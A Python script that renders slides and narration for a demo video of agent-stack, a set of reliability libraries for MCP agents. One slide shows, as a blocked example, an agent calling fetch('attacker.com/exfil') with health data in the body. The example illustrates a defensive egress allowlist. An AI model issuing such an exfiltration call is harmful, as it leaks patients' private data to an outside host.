"""Generate a 3-minute Devpost demo video for agent-stack.

Produces 8 slide PNGs at 1920x1080, narrates each with macOS `say` (Samantha),
then ffmpeg-stitches into a single MP4 at /tmp/agent-stack-demo.mp4.

The voice-over text mirrors §6 of the Devpost submission bundle.
"""
from PIL import Image, ImageDraw, ImageFont
import subprocess, os, shutil, textwrap

W, H = 1920, 1080
WORKDIR = "/tmp/demo-video-build"
OUT = "/tmp/agent-stack-demo.mp4"

shutil.rmtree(WORKDIR, ignore_errors=True)
os.makedirs(WORKDIR, exist_ok=True)

BG = (15, 17, 23)
FG = (235, 240, 248)
ACCENT = (102, 178, 255)
SUBTLE = (140, 152, 170)
CARD_BG = (24, 28, 38)
GREEN = (102, 220, 150)
RED = (235, 110, 110)

def font(size, bold=False, mono=False, italic=False):
    if mono:
        return ImageFont.truetype("/System/Library/Fonts/Menlo.ttc", size)
    if bold:
        return ImageFont.truetype("/System/Library/Fonts/HelveticaNeue.ttc", size, index=1)
    return ImageFont.truetype("/System/Library/Fonts/HelveticaNeue.ttc", size, index=0)

def base():
    img = Image.new("RGB", (W, H), BG)
    d = ImageDraw.Draw(img)
    return img, d

def header(d, text, sub=None):
    d.text((90, 70), text, fill=FG, font=font(72, bold=True))
    if sub:
        d.text((90, 170), sub, fill=SUBTLE, font=font(34))

def footer(d, label):
    d.text((90, H - 80), f"agent-stack  ·  {label}", fill=SUBTLE, font=font(26, mono=True))

# ---------- Scene 1: title ----------
def scene1():
    img, d = base()
    d.text((90, 280), "agent-stack", fill=FG, font=font(180, bold=True))
    d.text((90, 480), "Six reliability primitives for production MCP agents.",
           fill=SUBTLE, font=font(48))
    d.text((90, 580), "TypeScript  ·  Python  ·  MCP",
           fill=ACCENT, font=font(40, bold=True))
    d.text((90, 720), "Mukunda Rao Katta  ·  Agents Assemble 2026  ·  DOI 10.5281/zenodo.20074702",
           fill=SUBTLE, font=font(28, mono=True))
    return img

# ---------- Scene 2: six libraries grid ----------
def scene2():
    img, d = base()
    header(d, "Six independently published libraries",
           sub="Each one solves one production reliability concern. Adopt à la carte.")
    libs = [
        ("AgentFit",    "context-window fitting"),
        ("AgentGuard",  "network egress allowlist"),
        ("AgentSnap",   "tool-call snapshot tests"),
        ("AgentVet",    "tool-arg validation"),
        ("AgentCast",   "structured output enforcer"),
        ("AgentBudget", "token + dollar caps"),
    ]
    GRID_TOP = 280
    GRID_LEFT = 90
    CARD_W = 560
    CARD_H = 200
    GAP_X = 40
    GAP_Y = 36
    for i, (name, desc) in enumerate(libs):
        col = i % 3
        row = i // 3
        x = GRID_LEFT + col * (CARD_W + GAP_X)
        y = GRID_TOP + row * (CARD_H + GAP_Y)
        d.rounded_rectangle((x, y, x + CARD_W, y + CARD_H), radius=22,
                            fill=CARD_BG, outline=(40, 46, 62), width=1)
        d.rectangle((x, y + 22, x + 6, y + CARD_H - 22), fill=ACCENT)
        d.text((x + 36, y + 36), name, fill=FG, font=font(54, bold=True))
        d.text((x + 36, y + 116), desc, fill=SUBTLE, font=font(30))
    footer(d, "scene 2 of 8")
    return img

# ---------- Scene 3: install ----------
def scene3():
    img, d = base()
    header(d, "Install only what you need",
           sub="Each library is under 500 LOC, zero runtime dependencies.")
    box_y = 380
    d.rounded_rectangle((90, box_y, W - 90, box_y + 280), radius=22, fill=CARD_BG)
    d.text((130, box_y + 40), "$ npm i \\", fill=GREEN, font=font(40, mono=True))
    d.text((180, box_y + 100), "@mukundakatta/agentvet \\", fill=FG, font=font(40, mono=True))
    d.text((180, box_y + 160), "@mukundakatta/agentguard \\", fill=FG, font=font(40, mono=True))
    d.text((180, box_y + 220), "@mukundakatta/agentbudget", fill=FG, font=font(40, mono=True))
    d.text((90, 750), "Same surface available on PyPI: pip install agentvet agentguard agentbudget",
           fill=SUBTLE, font=font(30, mono=True))
    footer(d, "scene 3 of 8")
    return img

# ---------- Scene 4: AgentVet ----------
def scene4():
    img, d = base()
    header(d, "AgentVet — typed errors with retry hints",
           sub="When a tool call comes in malformed, the next LLM turn can self-correct.")

    # Code panel
    code_y = 300
    d.rounded_rectangle((90, code_y, 1020, code_y + 600), radius=22, fill=CARD_BG)
    code_lines = [
        ("// wrap the FHIR patient lookup", SUBTLE),
        ("const lookup = vet(", FG),
        ("  patientLookupSchema,", FG),
        ("  raw_lookup_patient,", FG),
        (");", FG),
        ("", FG),
        ("// agent calls with a malformed id", SUBTLE),
        ("await lookup({ patient_id: '???' });", FG),
        ("", FG),
        ("// throws ToolArgError with retry hint", RED),
        ("//   patient_id must match", RED),
        ("//   ^[A-Za-z0-9-]{1,64}$", RED),
    ]
    for i, (line, col) in enumerate(code_lines):
        d.text((130, code_y + 30 + i * 46), line, fill=col, font=font(34, mono=True))

    # Result panel
    res_y = 300
    d.rounded_rectangle((1080, res_y, W - 90, res_y + 600), radius=22, fill=(28, 22, 22))
    d.text((1120, res_y + 30), "Next LLM turn", fill=SUBTLE, font=font(30))
    d.text((1120, res_y + 90), "Tool call rejected.", fill=RED, font=font(36, bold=True))
    d.text((1120, res_y + 150), "Reason:", fill=SUBTLE, font=font(28))
    d.text((1120, res_y + 200), "patient_id must match", fill=FG, font=font(32, mono=True))
    d.text((1120, res_y + 240), "^[A-Za-z0-9-]{1,64}$", fill=FG, font=font(32, mono=True))
    d.text((1120, res_y + 320), "Retry: ", fill=SUBTLE, font=font(28))
    d.text((1120, res_y + 370), "lookup({ patient_id: ", fill=GREEN, font=font(30, mono=True))
    d.text((1120, res_y + 420), '  "patient-12345"', fill=GREEN, font=font(30, mono=True))
    d.text((1120, res_y + 470), "})", fill=GREEN, font=font(30, mono=True))

    footer(d, "scene 4 of 8")
    return img

# ---------- Scene 5: AgentGuard + AgentBudget ----------
def scene5():
    img, d = base()
    header(d, "AgentGuard + AgentBudget — defensive by default",
           sub="Block egress to non-allowlisted hosts. Cap tokens and dollars per run.")

    # Guard panel (left)
    gy = 300
    d.rounded_rectangle((90, gy, 920, gy + 600), radius=22, fill=CARD_BG)
    d.text((130, gy + 30), "AgentGuard", fill=ACCENT, font=font(46, bold=True))
    lines = [
        "guard.allow([",
        "  'hapi.fhir.org',",
        "  'fhir.epic.com',",
        "]);",
        "",
        "// agent attempts:",
        "fetch('attacker.com/exfil', {",
        "  body: JSON.stringify(phi),",
        "});",
        "",
        "// EgressViolation",
        "//   host attacker.com not allowlisted",
    ]
    cols = [FG, FG, FG, FG, FG, SUBTLE, FG, FG, FG, FG, RED, RED]
    for i, line in enumerate(lines):
        d.text((130, gy + 100 + i * 38), line, fill=cols[i], font=font(28, mono=True))

    # Budget panel (right)
    by = 300
    d.rounded_rectangle((980, by, W - 90, by + 600), radius=22, fill=CARD_BG)
    d.text((1020, by + 30), "AgentBudget", fill=ACCENT, font=font(46, bold=True))
    lines = [
        "budget({",
        "  max_tokens: 50_000,",
        "  max_dollars: 0.50,",
        "});",
        "",
        "// runaway loop",
        "//   step 1: 8K tok",
        "//   step 2: 14K tok",
        "//   step 3: 23K tok",
        "//   step 4: 38K tok",
        "//   step 5: BudgetExceeded",
        "//     — early termination",
    ]
    cols = [FG, FG, FG, FG, FG, SUBTLE, SUBTLE, SUBTLE, SUBTLE, SUBTLE, RED, RED]
    for i, line in enumerate(lines):
        d.text((1020, by + 100 + i * 38), line, fill=cols[i], font=font(28, mono=True))

    footer(d, "scene 5 of 8")
    return img

# ---------- Scene 6: MCP servers ----------
def scene6():
    img, d = base()
    header(d, "Every primitive also ships as an MCP server",
           sub="Callable from Claude Desktop, Cursor, Continue, or any MCP client.")

    box_y = 320
    d.rounded_rectangle((90, box_y, W - 90, box_y + 580), radius=22, fill=CARD_BG)
    d.text((130, box_y + 40), "claude_desktop_config.json", fill=SUBTLE, font=font(30, mono=True))
    code = [
        "{",
        '  "mcpServers": {',
        '    "agentvet": {',
        '      "command": "npx",',
        '      "args": ["-y", "@mukundakatta/agentvet-mcp"]',
        '    },',
        '    "agentguard": {',
        '      "command": "npx",',
        '      "args": ["-y", "@mukundakatta/agentguard-mcp"]',
        '    }',
        "  }",
        "}",
    ]
    for i, line in enumerate(code):
        d.text((130, box_y + 110 + i * 38), line, fill=FG, font=font(30, mono=True))

    footer(d, "scene 6 of 8")
    return img

# ---------- Scene 7: artifact + paper ----------
def scene7():
    img, d = base()
    header(d, "Backed by a peer-reviewable artifact paper",
           sub="DOI minted, source archived, under review at ASE 2026 Tools track.")

    cards = [
        ("Zenodo DOI",     "10.5281/zenodo.20074702",     "DataCite-registered"),
        ("Source",         "github.com/MukundaKatta/\nagent-stack",     "MIT licensed"),
        ("Software Heritage", "all 6 lib repos archived",     "permanent SWHIDs"),
        ("ASE 2026 Tools", "submission rendered",     "ACM sigconf review mode"),
    ]
    GRID_TOP = 320
    GRID_LEFT = 90
    CARD_W = 860
    CARD_H = 250
    GAP_X = 40
    GAP_Y = 40
    for i, (title, val, note) in enumerate(cards):
        col = i % 2
        row = i // 2
        x = GRID_LEFT + col * (CARD_W + GAP_X)
        y = GRID_TOP + row * (CARD_H + GAP_Y)
        d.rounded_rectangle((x, y, x + CARD_W, y + CARD_H), radius=22, fill=CARD_BG)
        d.rectangle((x, y + 22, x + 6, y + CARD_H - 22), fill=ACCENT)
        d.text((x + 36, y + 28), title, fill=ACCENT, font=font(36, bold=True))
        d.text((x + 36, y + 90), val, fill=FG, font=font(34, mono=True))
        d.text((x + 36, y + CARD_H - 60), note, fill=SUBTLE, font=font(26))

    footer(d, "scene 7 of 8")
    return img

# ---------- Scene 8: outro ----------
def scene8():
    img, d = base()
    d.text((90, 200), "agent-stack", fill=FG, font=font(160, bold=True))
    d.text((90, 380), "Six primitives.", fill=ACCENT, font=font(72, bold=True))
    d.text((90, 470), "Three runtimes.", fill=ACCENT, font=font(72, bold=True))
    d.text((90, 560), "One unified surface for production reliability.",
           fill=FG, font=font(48))
    d.text((90, 760), "github.com/MukundaKatta/agent-stack", fill=SUBTLE, font=font(34, mono=True))
    d.text((90, 810), "DOI 10.5281/zenodo.20074702", fill=SUBTLE, font=font(34, mono=True))
    d.text((90, 900), "Submitted to Agents Assemble 2026", fill=SUBTLE, font=font(28))
    return img

# Voice-over per scene (Samantha; 25 wps target)
NARRATION = [
    # scene 1 — title (~12s)
    "agent stack. Six reliability primitives for production MCP agents. "
    "TypeScript, Python, and Model Context Protocol. "
    "Submitted by Mukunda Rao Katta to Agents Assemble 2026.",

    # scene 2 — six libs grid (~22s)
    "Reliability concerns for L L M agents are usually bundled into one heavy framework. "
    "agent stack splits them into six independently published libraries. "
    "Each one solves a single production reliability concern. "
    "Agent Fit handles context window fitting. "
    "Agent Guard enforces a network egress allowlist. "
    "Agent Snap captures snapshot tests for tool call traces. "
    "Agent Vet validates tool arguments. "
    "Agent Cast enforces structured outputs. "
    "Agent Budget caps tokens and dollars per run.",

    # scene 3 — install (~14s)
    "You install only the libraries you need. "
    "Each one is under five hundred lines of code with zero runtime dependencies. "
    "The same surface is available on Pi P I, so a Python team and a TypeScript team can interoperate.",

    # scene 4 — AgentVet (~28s)
    "Here is a F H I R patient lookup wrapped with Agent Vet. "
    "When the agent attempts to call it with a malformed patient id, "
    "Agent Vet throws a typed Tool Arg Error. "
    "The error carries a retry hint that the next L L M turn can use to self correct. "
    "On the right, you can see the next turn picking up the hint and issuing a valid call. "
    "This pattern eliminates the most common production failure mode: "
    "a model emitting a structurally bad tool call and silently breaking the run.",

    # scene 5 — Guard + Budget (~28s)
    "Agent Guard refuses any H T T P egress to a domain that is not on the allowlist. "
    "If the agent tries to post protected health information to an attacker domain, "
    "the request is rejected at the network layer, not at the prompt layer. "
    "Agent Budget enforces a hard token and dollar cap per run. "
    "When a runaway loop crosses the cap, the run terminates early "
    "rather than billing a thousand dollars on a single patient lookup.",

    # scene 6 — MCP server (~24s)
    "Every primitive also ships as an M C P server. "
    "Add the agent vet and agent guard servers to your Claude Desktop configuration "
    "and the remote model can call them as tools. "
    "Validate a tool call before executing it. "
    "Check an outbound request against the allowlist before sending it. "
    "The same primitives, available to any M C P aware client.",

    # scene 7 — artifact + paper (~24s)
    "agent stack is backed by a peer reviewable artifact paper. "
    "A Data Cite registered Zenodo D O I has been minted. "
    "All six library repositories are archived in Software Heritage with permanent identifiers. "
    "The same package is currently under review at the A S E 2026 Tools track, "
    "rendered in A C M sigconf review mode.",

    # scene 8 — outro (~14s)
    "agent stack. "
    "Six primitives. Three runtimes. "
    "One unified surface for production reliability. "
    "Source on GitHub, D O I on Zenodo. "
    "Thank you.",
]

assert len(NARRATION) == 8, "8 scenes required"
SCENES = [scene1, scene2, scene3, scene4, scene5, scene6, scene7, scene8]

# Build per-scene assets
audio_clips = []
video_clips = []
for i, (scene_fn, text) in enumerate(zip(SCENES, NARRATION), start=1):
    png = f"{WORKDIR}/scene{i}.png"
    aiff = f"{WORKDIR}/scene{i}.aiff"
    wav = f"{WORKDIR}/scene{i}.wav"
    mp4 = f"{WORKDIR}/scene{i}.mp4"
    print(f"== scene {i} ==")
    img = scene_fn()
    img.save(png, "PNG", optimize=True)

    # Synthesize audio (Samantha, slowed slightly for clarity)
    subprocess.run(["say", "-v", "Samantha", "-r", "180", "-o", aiff, text], check=True)
    # Convert to wav
    subprocess.run(["ffmpeg", "-y", "-loglevel", "error",
                    "-i", aiff, "-ar", "44100", "-ac", "2", wav], check=True)

    # Get duration
    out = subprocess.check_output(
        ["ffprobe", "-v", "error", "-show_entries", "format=duration",
         "-of", "default=noprint_wrappers=1:nokey=1", wav]
    ).decode().strip()
    dur = float(out)
    print(f"   audio {dur:.2f}s")

    # Build per-scene mp4: still image + wav, sized 1920x1080
    subprocess.run([
        "ffmpeg", "-y", "-loglevel", "error",
        "-loop", "1", "-i", png,
        "-i", wav,
        "-c:v", "libx264", "-tune", "stillimage", "-pix_fmt", "yuv420p",
        "-vf", "scale=1920:1080,format=yuv420p",
        "-r", "30",
        "-c:a", "aac", "-b:a", "192k",
        "-shortest",
        mp4,
    ], check=True)
    video_clips.append(mp4)

# Concat list
concat_path = f"{WORKDIR}/concat.txt"
with open(concat_path, "w") as f:
    for clip in video_clips:
        f.write(f"file '{clip}'\n")

# Re-encode-on-concat to avoid timestamp glitches
subprocess.run([
    "ffmpeg", "-y", "-loglevel", "error",
    "-f", "concat", "-safe", "0", "-i", concat_path,
    "-c:v", "libx264", "-pix_fmt", "yuv420p",
    "-c:a", "aac", "-b:a", "192k",
    OUT,
], check=True)

# Probe final
total = subprocess.check_output(
    ["ffprobe", "-v", "error", "-show_entries", "format=duration",
     "-of", "default=noprint_wrappers=1:nokey=1", OUT]
).decode().strip()
print(f"\nWrote {OUT}  duration={float(total):.1f}s  bytes={os.path.getsize(OUT)}")
